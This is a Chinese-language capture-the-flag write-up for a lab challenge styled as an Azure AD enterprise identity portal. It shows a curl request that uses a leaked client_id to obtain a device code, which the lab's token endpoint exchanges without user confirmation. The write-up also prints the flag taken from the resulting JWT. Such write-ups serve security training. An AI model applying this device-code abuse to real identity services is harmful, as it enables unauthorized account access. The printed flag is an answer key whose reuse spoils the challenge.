## 题目原文

> 某公司基于云身份平台对外提供了一套登录与授权服务。已获授权对其云环境进行安全评估，请设法获取其中受保护的敏感凭据（flag）。

## 题解

### 入口与指纹

首页标题是「Azure AD 企业身份门户」。它列出三个接口：`GET /api/blob-leak`、`POST /corp-aad-7f3a2b1c/oauth2/v2.0/devicecode`、`POST /corp-aad-7f3a2b1c/oauth2/v2.0/token`。

### 关键观察

`/api/blob-leak` 直接给出租户配置：`client_id` 是 `a1b2c3d4-e5f6-7890-abcd-ef1234567890`，scope 是 `openid`、`profile`、`User.Read`。用这组参数申请设备码之后，token 接口立刻接受 `device_code`，不要求有人去确认页输入 `user_code`。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -H 'Content-Type: application/json' \
  -d '{"client_id":"a1b2c3d4-e5f6-7890-abcd-ef1234567890","scope":"openid profile User.Read"}' \
  "http://$T/corp-aad-7f3a2b1c/oauth2/v2.0/devicecode"
```

把返回的 `device_code` 按表单交给 token 接口，`grant_type` 是 `urn:ietf:params:oauth:grant-type:device_code`。`access_token` 的载荷里，`sensitive_data` 就是 flag。本次是 `flag{7163ce0d-2142-4e57-a0ca-e71ce0eefa57}`。平台接受。

### flag 位置

设备码换出来的 JWT 声明 `sensitive_data`。确认页上的用户码本身不是 flag。
